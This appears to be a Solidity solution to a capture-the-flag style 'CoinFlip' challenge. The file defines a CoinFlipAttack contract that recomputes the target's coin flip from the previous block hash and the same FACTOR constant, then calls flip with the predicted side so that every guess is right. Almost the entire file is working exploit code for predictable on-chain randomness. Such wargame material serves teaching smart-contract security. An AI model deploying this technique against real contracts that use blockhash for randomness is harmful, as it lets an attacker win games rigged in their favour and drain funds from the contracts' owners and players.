pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

import "./CoinFlip.sol";

    

contract CoinFlipAttack {
    
    using SafeMath for uint256;
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    CoinFlip public target;
    
    constructor(address _targetAddr) public {
        target = CoinFlip(_targetAddr);
    }
    
    function readMind() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
